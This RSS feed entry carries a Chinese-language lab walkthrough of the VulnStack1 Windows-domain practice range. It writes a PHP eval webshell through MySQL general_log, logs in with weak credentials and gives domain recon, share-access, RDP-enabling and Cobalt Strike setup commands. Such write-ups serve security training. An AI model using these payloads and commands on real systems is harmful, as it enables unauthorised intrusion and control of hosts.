<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>pentest on Under The Ginkgo</title>
        <link>https://ginkgo.org.cn/categories/pentest/</link>
        <description>Recent content in pentest on Under The Ginkgo</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-uk</language>
        <lastBuildDate>Tue, 11 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://ginkgo.org.cn/categories/pentest/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Internal Pentest VulnStack1 内网渗透练习</title>
        <link>https://ginkgo.org.cn/posts/internal_pentest_vulnstack1/</link>
        <pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ginkgo.org.cn/posts/internal_pentest_vulnstack1/</guid>
        <description>&lt;h2 id=&#34;internal-pentest-vulnstack1-内网渗透练习&#34;&gt;Internal Pentest VulnStack1 内网渗透练习&lt;/h2&gt;
&lt;h3 id=&#34;靶场搭建&#34;&gt;靶场搭建&lt;/h3&gt;
&lt;p&gt;搭建环境: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统：MacosX &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;虚拟机：VMware Fusion &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;靶场信息：&lt;a class=&#34;link&#34; href=&#34;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;找了一圈教程都是在Windows上搭建的，不过只要了解原理，其实放到mac甚至是其他环境下也是一样的。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;红日的靶场非常友好了，我们只需要将靶机从百度云下载下来解压缩，看到很多的文件不要慌，直接用vmware fusion打开vmx文件就可以开启靶机。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来我们就分别导入三个虚拟机，并且进行少量的配置 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Windows 7 x64 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将默认的网卡选择为Host Only，在vmware fusion里叫做&amp;quot;Private to my Mac&amp;quot;，即独立于mac主机本身的一个虚拟网络中； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;增加一张网卡，选择为桥接，这里叫Autodetect，就是和mac在同一个内网网段中，相当于一台虚拟主机连入（存在风险，慎用，可以考虑选择另一个Host-Only的虚拟网段）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;开启虚拟机，输入密码（所有虚拟机统一为hongrisec@2019，之后不再重复）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;搜索phpstudy，开启服务（如果需要用局域网访问需要在防火墙进行修改，慎用） &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;配置至此完成。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows Server 2003 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开启即可，无需做任何调整，默认静态IP为192.168.52.141。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows Server 2008 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开启之后修改密码即可，需要复杂密码，记得要记录下来不要遗忘，默认静态IP为192.168.52.138，无需其他修改。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/vulnStack1.png&#34;
         alt=&#34;Figure 1: 内网渗透网络拓扑&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;内网渗透网络拓扑&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;至此配置就结束了，别害怕，前辈们为了让工具好用做了很多努力，我们只需要站在巨人的肩膀上继续学习就可以了。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;前瞻知识&#34;&gt;前瞻知识&lt;/h3&gt;
&lt;p&gt;如果是第一次接触这种和Windows域有关的渗透练习的话，建议还是先了解一下域的相关知识，这不仅会帮助理解复现的过程，同样重要的是这也会帮助大家解决在复现过程中出现的各种问题（靶场的设计也并不是面面俱到的，不同的环境下运行也会碰到很多未知的问题） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/4tq9U&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows中的工作组(Work Group)、域(Domain)、域控(DC)、活动目录(AD)介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/HQo14&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AD域的详细介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;外网渗透&#34;&gt;外网渗透&lt;/h3&gt;
&lt;h4 id=&#34;信息收集&#34;&gt;信息收集&lt;/h4&gt;
&lt;p&gt;老规矩先用nmap进行扫描 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sS 192.168.0.104/24
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_16-13-08_screenshot.png&#34;
         alt=&#34;Figure 2: nmap 端口扫描&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;nmap 端口扫描&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;发现80端口监听http服务，直接打开网页看一下：&lt;a class=&#34;link&#34; href=&#34;http://192.168.0.100&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://192.168.0.100&lt;/a&gt; : &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-02-25_screenshot.png&#34;
         alt=&#34;Figure 3: phpStudy探针1&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;phpStudy探针1&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_17-00-47_screenshot.png&#34;
         alt=&#34;Figure 4: phpStudy 探针2&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;phpStudy 探针2&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;从php探针中我们可以获取大量主机的信息，这里还用弱口令测试了数据库的连接，我们先放着，可能后续有用。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来用dirmap来扫一下目录： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dirmap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://192.168.0.100&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lcf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-05-26_screenshot.png&#34;
         alt=&#34;Figure 5: dirmap 目录爆破&#34; width=&#34;500px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;dirmap 目录爆破&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;根据扫描的结果，我们访问/phpmyadmin界面，来对mysql数据库进行一些操作: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这里我们先尝试一些弱口令，实在不行再用BrupSuite爆破，例如：root, admin, 123456，发现这里直接用root:root就进去了。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;getshell&#34;&gt;getshell&lt;/h4&gt;
&lt;p&gt;那么下一步就是要想办法getshell，看到mysql自然想到可以利用 &lt;code&gt;SELECT INTO DUMPFILE/OUTFILE&lt;/code&gt; 来写入一句话木马来获取shell。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;但我们知道要使用这个语法需要满足三个条件： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;secure_file_priv&lt;/code&gt; 变量为空，或者为我们所知道的路径中，表示支持数据的导入导出； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;目标目录的权限可写，mysql用户也有写入的权限； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;需要目标目录的绝对路径。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么我们先查看 &lt;code&gt;secure-file-priv&lt;/code&gt; 的值，发现为NULL，此路不通： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_17-16-27_screenshot.png&#34;
         alt=&#34;Figure 6: 查询secure-file-priv的值&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 6: &lt;!-- raw HTML omitted --&gt;查询secure-file-priv的值&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们知道还有一种写入的方法就是日志法 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SHOW&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VARIABLES&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LIKE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%general%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;查看日志文件相关配置&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-11_17-26-30_screenshot.png&#34;
         alt=&#34;Figure 7: 查看general_log的值&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 7: &lt;!-- raw HTML omitted --&gt;查看general_log的值&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来我们开启general log，并且通过之前php探针所得到的绝对路径设置log文件的地址，最后写入一句话木马： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GLOBAL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;general_log&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;开启&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;general&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log模式&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GLOBAL&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;general_log_file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:/phpStudy/WWW/1.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;设置日志目录为我们想要执行的&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell地址&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[cmd]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;直接写入&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell就会被记录到日志文件中去&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;蚁剑连接成功 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-08-22_screenshot.png&#34;
         alt=&#34;Figure 8: 蚁剑连接&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 8: &lt;!-- raw HTML omitted --&gt;蚁剑连接&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;其实到这里就已经可以通过蚁剑来getshell了，但我们也可以进去再看看。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;进入之后发现有cms， &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-20-31_screenshot.png&#34;
         alt=&#34;Figure 9: 发现cms&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 9: &lt;!-- raw HTML omitted --&gt;发现cms&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;尝试访问后根据公告信息进入后台， &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-22-00_screenshot.png&#34;
         alt=&#34;Figure 10: 进入cms&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 10: &lt;!-- raw HTML omitted --&gt;进入cms&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;通过修改或者增加模版文件也可以用来getshell &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-12_10-30-41_screenshot.png&#34;
         alt=&#34;Figure 11: 模版文件&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 11: &lt;!-- raw HTML omitted --&gt;模版文件&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;内网渗透&#34;&gt;内网渗透&lt;/h3&gt;
&lt;h4 id=&#34;信息收集&#34;&gt;信息收集&lt;/h4&gt;
&lt;p&gt;建议一些基础的信息可以直接在get的shell中执行来获取，因为CS的beacon一个是不稳定而且返回速度也慢： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig /all   查看本机ip，所在域
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;route print     打印路由信息
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view        查看局域网内其他主机名
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;arp -a          查看arp缓存
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net start       查看开启了哪些服务
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share       查看开启了哪些共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share ipc$  开启ipc共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share c$    开启c盘共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;192.168.xx.xx&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;pc$ &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; /user:&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;   与192.168.xx.xx建立空连接
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;192.168.xx.xx&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;$ &lt;span class=&#34;s2&#34;&gt;&amp;#34;密码&amp;#34;&lt;/span&gt; /user:&lt;span class=&#34;s2&#34;&gt;&amp;#34;用户名&amp;#34;&lt;/span&gt;  建立c盘共享
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dir &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;192.168.xx.xx&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;$&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser    查看192.168.xx.xx c盘user目录下的文件
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;​
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user                 查看本机用户列表
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user /domain         查看域用户
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net localgroup administrators   查看本地管理员组（通常会有域用户）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view /domain         查看有几个域
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user 用户名 /domain   获取指定域用户的信息
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group 组名 /domain    查看域中某工作组
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &lt;span class=&#34;s2&#34;&gt;&amp;#34;domain admins&amp;#34;&lt;/span&gt; /domain  查看域管理员的名字
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &lt;span class=&#34;s2&#34;&gt;&amp;#34;domain computers&amp;#34;&lt;/span&gt; /domain  查看域中的其他主机名
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net group &lt;span class=&#34;s2&#34;&gt;&amp;#34;doamin controllers&amp;#34;&lt;/span&gt; /domain  查看域控制器（可能有多台）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; find &lt;span class=&#34;s2&#34;&gt;&amp;#34;3389&amp;#34;&lt;/span&gt;   查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;REG ADD HKLM&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentControlSet&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;ontrol&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;erminal&lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;Server /v fDenyTSConnections /t REG_DWORD /d &lt;span class=&#34;m&#34;&gt;00000000&lt;/span&gt; /f  用于开启远程桌面登录
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;横向移动&#34;&gt;横向移动&lt;/h4&gt;
&lt;p&gt;启动CS服务端： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo ./teamserver 192.168.0.106 password
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打开客户端CS连接： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java -XX:+UseParallelGC -XX:+AggressiveHeap -XX:ParallelGCThreads&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; -jar cobaltstrike.jar
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-50-18_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-57-37_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-58-04_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_14-59-14_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
